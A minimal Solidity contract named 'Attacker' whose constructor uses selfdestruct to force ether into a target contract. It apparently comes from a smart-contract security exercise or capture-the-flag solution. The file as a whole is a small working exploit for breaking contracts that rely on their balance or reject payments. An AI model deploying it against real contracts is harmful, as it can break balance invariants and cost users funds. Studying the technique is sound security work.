// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attacker {
    constructor(address payable _target) payable {
        // selfdestruct will "forcefully" transfer the money
        selfdestruct(_target);
    }
}
